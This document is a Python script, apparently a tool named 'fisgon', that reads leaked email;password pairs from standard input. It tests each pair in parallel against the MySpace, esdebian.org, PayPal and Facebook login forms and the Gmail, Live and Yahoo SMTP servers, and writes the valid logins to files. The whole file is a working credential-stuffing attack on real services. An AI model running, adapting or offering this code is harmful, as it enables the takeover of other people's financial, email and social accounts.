#!/usr/bin/env python
#-*- coding: UTF-8 -*-

from debug import debug
from decoradores import Retry, Verbose, Async, nothreadsafe
from multiprocessing import Process
from functools import wraps
import debug as Debug
import os
import re
import smtplib
import socket
import time
import sys

import browser
from browser import BrowserStateError

RC = "%s/.fisgon/" % os.getenv("HOME")
VERBOSE = 0


class Discovers(list):
    def __call__(self, func):
        
        funcname = func.func_name
        truesname = funcname + ".txt"
        falsesname = "no-" + funcname + ".txt"
        nonesname = "none-" + funcname + ".txt"

        trues = set(read(truesname))
        falses = set(read(falsesname))

        @Async
        @Verbose(VERBOSE)
        @wraps(func)
        def dfunc(*args, **kwargs):
            if args in trues:
                result = True
            elif args in falses:
                result = False
            else:
                result = func(*args, **kwargs)
                line = ";".join(args)
                if result:
                    write(line, truesname)
                elif result is not None:
                    write(line, falsesname)
                else:
                    write(line, nonesname)
            if result:
                debug("%s: %s, %s" % (funcname, args[0], args[1]))

        self.append(dfunc)
        return dfunc

discovers = Discovers()

@Verbose(VERBOSE)
def write(text, destination):
    f = open(destination, "a")
    f.write("%s\n" % text)
    f.close()


def read(filename):
    try:
        pairs = [tuple(line.strip().split(";"))
            for line in open(filename).readlines()]
    except IOError:
        pairs = []

    return pairs



def ismail(user):
    if re.search(
        r"(^[-!#$%&'*+/=?^_`{}|~0-9A-Z]+(\.[-!#$%&'*+/=?^_`{}|~0-9A-Z]+)*"
        r'|^"([\001-\010\013\014\016-\037!#-\[\]-\177]'
        r'|\\[\001-011\013\014\016-\177])*"'
        r')@(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+[A-Z]{2,6}\.?$',
        user, re.IGNORECASE):
        return True
    else:
        return False


@discovers
@nothreadsafe
def myspace(user, password):
    if ismail(user):
        b = browser.BROWSER()
        b.clear_cookies()
        form = b.get_forms("http://myspace.com")[1]
        form["""ctl00$ctl00$cpMain$cpMain$LoginBox$Email_Textbox"""] = user
        form["""ctl00$ctl00$cpMain$cpMain"""
            """$LoginBox$Password_Textbox"""] = password
        try:
            code, title = form.submit()
            if code == 200:
                if """?fuseaction=signout""" in b.get_html():
                    return "myspace.com"
                else:
                    return False
            else:
                return None
        except BrowserStateError:
            return None
    else:
        return False


@discovers
@nothreadsafe
def esdebian(user, password):
    if ismail(user):
        b = browser.BROWSER()
        b.clear_cookies()
        form = b.get_forms("http://www.esdebian.org")[1]
        form["name"] = user
        form["pass"] = password
        try:
            code, title = form.submit()
            if code == 200:
                if """<a href="/logout">Salir</a>""" in b.get_html():
                    return "esdebian.org"
                else:
                    return False
            else:
                return None
        except BrowserStateError:
            return None
    else:
        return False


@discovers
@nothreadsafe
def paypal(user, password):
    if ismail(user):
        b = browser.BROWSER()
        b.clear_cookies()
        form = b.get_forms("https://www.paypal.com/ar/cgi-bin/webscr"
            "?cmd=_login-run")[1]
        form["login_email"] = user
        form["login_password"] = password
        try:
            code, title = form.submit()
            if code == 200:
                if ('cgi-bin/webscr?cmd=_login-done' in b.get_html()):
                    return "paypal.com"
                elif ('cgi-bin/webscr?cmd=_logout' in b.get_html(
                    "https://www.paypal.com/ar/cgi-bin/webscr?"
                    "cmd=_account&nav=0")):
                    return "paypal.com"
                else:
                    return False
            else:
                return None
        except BrowserStateError:
            return None
    else:
        return False


@discovers
@nothreadsafe
def facebook(user, password):
    if ismail(user):
        b = browser.BROWSER()
        b.clear_cookies()
        form = b.get_forms("http://facebook.com")[0]
        form["email"] = user
        form["pass"] = password
        try:
            code, title = form.submit()
            if code == 200:
                if """facebook.com/logout.php?""" in b.get_html():
                    return "facebook.com"
                else:
                    return False
            else:
                return None
        except BrowserStateError:
            return None
    else:
        return False


@discovers
def gmail(user, password):
    if ismail(user):
        smtp = smtplib.SMTP()
        try:
            smtp.connect("smtp.gmail.com", 587)
            smtp.ehlo()
            smtp.starttls()
            smtp.debuglevel = 0
            try:
                smtp.login(user, password)
            except smtplib.SMTPAuthenticationError:
                return False
            except socket.sslerror:
                return False
        except socket.gaierror:
            debug("E: socket.gaierror")
            return None
    else:
        return False
    return True


@discovers
def live(user, password):
    if ismail(user):
        smtp = smtplib.SMTP()
        try:
            smtp.connect("smtp.live.com", 587)
            smtp.ehlo()
            smtp.starttls()
            smtp.debuglevel = 0
            try:
                smtp.login(user, password)
            except smtplib.SMTPAuthenticationError:
                return False
            except socket.sslerror:
                return False
        except socket.gaierror:
            debug("E: socket.gaierror")
            return None
    else:
        return False
    return True


@discovers
def yahoo(user, password):
    if ismail(user) and "@yahoo." in user:
        smtp = smtplib.SMTP()
        try:
            smtp.connect("smtp.mail.yahoo.com", 587)
            smtp.debuglevel = 0
            smtp.ehlo()
            try:
                smtp.login(user, password)
            except smtplib.SMTPAuthenticationError:
                return False
        except socket.gaierror:
            debug("E: socket.gaierror")
            return None
    else:
        return False
    return True


def main():
    debug("FUN TIME!")
    
    stdin = sys.stdin.readlines()

    threads = 7
    pause = .1
    slots = [None] * threads
    for line in stdin:
        user, password = line.strip().split(";")[:2]
        user = user.lower()

        for discover in discovers:
            passed = False
            tries = 0
            while not passed:
                tries += 1
                for pos in xrange(threads):
                    if slots[pos] is None or not slots[pos].is_alive():
                        slots[pos] = discover(user, password)
                        passed = True
                        break
                time.sleep(pause)
            pause *= tries ** 0.2 * .9
            if tries > 10:
                pause = pause * 10 + 0.001

    for slot in slots:
        if slot is not None:
            slot.get_result()

    debug(">>> EOF !!")

if __name__ == "__main__":
    exit(main())
